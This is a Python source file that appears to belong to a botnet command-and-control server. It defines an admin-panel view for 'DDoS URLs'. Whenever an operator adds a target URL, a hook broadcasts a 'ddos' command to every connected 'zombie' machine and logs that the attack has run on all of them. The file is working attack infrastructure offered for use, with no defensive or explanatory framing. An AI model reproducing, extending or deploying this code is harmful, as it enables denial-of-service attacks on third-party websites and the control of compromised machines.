from sqlalchemy.orm import selectinload
from sqlalchemy import select
from sqladmin import ModelView
from starlette.requests import Request
from apps.ddos.models import DdosUrl
from apps.zombie.models import Command
from config.database import async_session_maker
from managers.c2_manager import c2_manager


class DDosAdmin(ModelView, model=DdosUrl):
    column_list = [
        DdosUrl.id,
        DdosUrl.url,  # Uses Zombie.__str__
        DdosUrl.status,

    ]
    # Forces JOIN so Zombie.__str__ doesn't crash the list view
    column_select_related_list = [Command.zombie]

    name = "Ddos Url"
    name_plural = "Ddos Urls"
    icon = "fa-solid fa-code"

    async def after_model_change(self, data: dict, model: Command, is_created: bool, request: Request) -> None:
        if is_created:
            print(data)
            # Pass the loaded object or a dictionary to the manager
            # We use full_command.zombie_id as the key for our WebSocket dictionary
            command = {
                'action': 'ddos',
                'url': data['url'],
            }
            await c2_manager.broadcast(command)
            print(f"[*] DDoS Command is executed for all zombies")
